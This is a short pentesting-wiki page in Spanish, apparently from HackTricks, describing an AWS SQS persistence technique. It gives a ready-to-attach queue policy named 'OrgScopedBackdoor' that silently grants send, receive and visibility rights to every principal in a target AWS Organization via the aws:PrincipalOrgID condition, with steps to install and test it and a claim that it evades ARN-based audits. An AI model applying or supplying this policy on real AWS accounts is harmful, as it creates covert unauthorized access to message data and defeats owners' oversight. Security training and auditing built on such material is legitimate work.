# AWS - SQS OrgID Policy Backdoor

{{#include ../../../../banners/hacktricks-training.md}}

Abusar de la resource policy de una cola SQS para conceder silenciosamente Send, Receive y ChangeMessageVisibility a cualquier principal que pertenezca a una AWS Organization objetivo, usando la condición aws:PrincipalOrgID. Esto crea una ruta oculta con alcance de organización (org-scoped) que a menudo evade controles que solo buscan ARNs de cuentas o roles explícitos o star principals.

### Backdoor policy (attach to the SQS queue policy)
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "OrgScopedBackdoor",
"Effect": "Allow",
"Principal": "*",
"Action": [
"sqs:ReceiveMessage",
"sqs:SendMessage",
"sqs:ChangeMessageVisibility",
"sqs:GetQueueAttributes"
],
"Resource": "arn:aws:sqs:REGION:ACCOUNT_ID:QUEUE_NAME",
"Condition": {
"StringEquals": { "aws:PrincipalOrgID": "o-xxxxxxxxxx" }
}
}
]
}
```
### Pasos
- Obtén el Organization ID usando la API de AWS Organizations.
- Obtén el ARN de la cola SQS y configura la política de la cola incluyendo la declaración anterior.
- Desde cualquier principal que pertenezca a esa Organization, envía y recibe un mensaje en la cola para validar el acceso.

### Impacto
- Acceso oculto a nivel de Organization para leer y escribir mensajes SQS desde cualquier cuenta en la AWS Organization especificada.

{{#include ../../../../banners/hacktricks-training.md}}
